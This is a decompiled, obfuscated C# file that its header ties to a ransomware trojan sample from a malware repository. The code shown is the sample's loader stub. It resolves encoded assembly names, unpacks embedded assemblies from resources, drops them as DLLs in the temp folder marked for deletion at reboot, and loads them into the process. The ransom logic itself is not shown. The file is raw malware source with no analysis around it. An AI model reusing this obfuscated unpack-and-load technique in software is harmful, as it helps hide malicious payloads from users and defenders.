// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Network Tools, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0E46C7B8-BA7C-4C19-8ED5-2E10AD141AFD
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.kkry-4541a4e9729f5d49606d77f6f336ad5be25b8d011e41e3b977709a847e7bae93.exe

using \u0003;
using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace \u0004
{
  internal sealed class \u0003
  {
    internal const string \u0001 = "{71461f04-2faa-4bb9-a0dd-28a79101b599}";
    private const int \u0002 = 4;
    private static Hashtable \u0003 = new Hashtable();

    [DllImport("kernel32", EntryPoint = "MoveFileEx")]
    private static extern bool \u0001(string existingFileName, string newFileName, int flags);

    internal static bool IsWebApplication
    {
      get
      {
        bool flag;
        try
        {
          string lower = Process.GetCurrentProcess().MainModule.ModuleName.ToLower();
          if (true)
          {
            int num = lower == "w3wp.exe" ? 1 : 0;
            if (true)
            {
              if (num != 0)
              {
                if (true)
                {
                  flag = true;
                  goto label_12;
                }
                else
                  goto label_12;
              }
              else
                num = lower == "aspnet_wp.exe" ? 1 : 0;
            }
            if (num != 0)
            {
              flag = true;
              goto label_12;
            }
          }
        }
        catch
        {
        }
label_10:
        return false;
label_12:
        if (true)
        {
          int num = flag ? 1 : 0;
          return false ? num != 0 : num != 0;
        }
        goto label_10;
      }
    }

    internal static void \u0001()
    {
      try
      {
        AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(\u0004.\u0003.\u0001);
      }
      catch
      {
      }
    }

    internal static unsafe Assembly \u0001(object sender, ResolveEventArgs e)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(18);
      \u0004.\u0003.\u0001 obj = new \u0004.\u0003.\u0001(e.Name);
      string base64String1 = Convert.ToBase64String(Encoding.UTF8.GetBytes(obj.\u0001(false)));
      string[] strArray = "ezM4NTU3ZmMyLThhMjgtNDMwNy1iNWNmLTc4Y2M0MzUzYzIzMX0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{bb748ebc-f1fb-4f07-88e4-3652550b4b59},ezM4NTU3ZmMyLThhMjgtNDMwNy1iNWNmLTc4Y2M0MzUzYzIzMX0=,[z]{bb748ebc-f1fb-4f07-88e4-3652550b4b59}".Split(',');
      string str1 = string.Empty;
      *(sbyte*) ((IntPtr) voidPtr + 16) = (sbyte) 0;
      *(sbyte*) ((IntPtr) voidPtr + 17) = (sbyte) 0;
      *(int*) voidPtr = 0;
      while (*(int*) voidPtr < strArray.Length - 1)
      {
        if (strArray[*(int*) voidPtr] == base64String1)
        {
          str1 = strArray[*(int*) voidPtr + 1];
          break;
        }
        *(int*) voidPtr = *(int*) voidPtr + 2;
      }
      if (str1.Length == 0 && obj.\u0004.Length == 0)
      {
        string base64String2 = Convert.ToBase64String(Encoding.UTF8.GetBytes(obj.\u0001));
        *(int*) ((IntPtr) voidPtr + 4) = 0;
        while (*(int*) ((IntPtr) voidPtr + 4) < strArray.Length - 1)
        {
          if (strArray[*(int*) ((IntPtr) voidPtr + 4)] == base64String2)
          {
            str1 = strArray[*(int*) ((IntPtr) voidPtr + 4) + 1];
            break;
          }
          *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) + 2;
        }
      }
      if (str1.Length > 0)
      {
        if (str1[0] == '[')
        {
          *(int*) ((IntPtr) voidPtr + 8) = str1.IndexOf(']');
          string str2 = str1.Substring(1, *(int*) ((IntPtr) voidPtr + 8) - 1);
          *(sbyte*) ((IntPtr) voidPtr + 16) = (sbyte) (str2.IndexOf('z') >= 0);
          *(sbyte*) ((IntPtr) voidPtr + 17) = (sbyte) (str2.IndexOf('t') >= 0);
          str1 = str1.Substring(*(int*) ((IntPtr) voidPtr + 8) + 1);
        }
        lock (\u0004.\u0003.\u0003)
        {
          if (\u0004.\u0003.\u0003.ContainsKey((object) str1))
            return (Assembly) \u0004.\u0003.\u0003[(object) str1];
          Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(str1);
          if (manifestResourceStream != null)
          {
            *(int*) ((IntPtr) voidPtr + 12) = (int) manifestResourceStream.Length;
            byte[] numArray = new byte[*(int*) ((IntPtr) voidPtr + 12)];
            manifestResourceStream.Read(numArray, 0, *(int*) ((IntPtr) voidPtr + 12));
            if (*(sbyte*) ((IntPtr) voidPtr + 16) != (sbyte) 0)
              numArray = \u0005.\u0001(numArray);
            Assembly assembly = (Assembly) null;
            if (*(sbyte*) ((IntPtr) voidPtr + 17) == (sbyte) 0)
            {
              try
              {
                assembly = Assembly.Load(numArray);
              }
              catch (FileLoadException ex)
              {
                *(sbyte*) ((IntPtr) voidPtr + 17) = (sbyte) 1;
              }
              catch (BadImageFormatException ex)
              {
                *(sbyte*) ((IntPtr) voidPtr + 17) = (sbyte) 1;
              }
            }
            if (*(sbyte*) ((IntPtr) voidPtr + 17) != (sbyte) 0)
            {
              try
              {
                string str3 = string.Format("{0}{1}\\", (object) Path.GetTempPath(), (object) str1);
                Directory.CreateDirectory(str3);
                string str4 = str3 + obj.\u0001 + ".dll";
                if (!File.Exists(str4))
                {
                  FileStream fileStream = File.OpenWrite(str4);
                  fileStream.Write(numArray, 0, numArray.Length);
                  fileStream.Close();
                  \u0004.\u0003.\u0001(str4, (string) null, 4);
                  \u0004.\u0003.\u0001(str3, (string) null, 4);
                }
                assembly = Assembly.LoadFile(str4);
              }
              catch
              {
              }
            }
            \u0004.\u0003.\u0003[(object) str1] = (object) assembly;
            return assembly;
          }
        }
      }
      return (Assembly) null;
    }

    internal struct \u0001
    {
      public string \u0001;
      public Version \u0002;
      public string \u0003;
      public string \u0004;

      public string \u0001(bool includeVersion)
      {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.Append(this.\u0001);
        if (true)
          goto label_8;
label_5:
        if (true)
        {
          stringBuilder.Append(this.\u0003.Length == 0 ? "neutral" : this.\u0003);
          stringBuilder.Append(", PublicKeyToken=");
          stringBuilder.Append(this.\u0004.Length == 0 ? "null" : this.\u0004);
        }
        return stringBuilder.ToString();
label_8:
        int num;
        for (int index = includeVersion ? 1 : 0; index != 0; index = num)
        {
          num = this.\u0002 != (Version) null ? 1 : 0;
          if (true)
          {
            if (num != 0)
            {
              stringBuilder.Append(", Version=");
              stringBuilder.Append((object) this.\u0002);
              break;
            }
            break;
          }
        }
        stringBuilder.Append(", Culture=");
        goto label_5;
      }

      public \u0001(string assemblyFullName)
      {
        this.\u0002 = (Version) null;
        this.\u0003 = string.Empty;
        this.\u0004 = string.Empty;
        this.\u0001 = string.Empty;
        string str1 = assemblyFullName;
        char[] chArray = new char[1]{ ',' };
        foreach (string str2 in str1.Split(chArray))
        {
          string str3 = str2.Trim();
          if (str3.StartsWith("Version="))
            this.\u0002 = new Version(str3.Substring(8));
          else if (str3.StartsWith("Culture="))
          {
            this.\u0003 = str3.Substring(8);
            if (this.\u0003 == "neutral")
              this.\u0003 = string.Empty;
          }
          else if (str3.StartsWith("PublicKeyToken="))
          {
            this.\u0004 = str3.Substring(15);
            if (this.\u0004 == "null")
              this.\u0004 = string.Empty;
          }
          else
            this.\u0001 = str3;
        }
      }
    }
  }
}
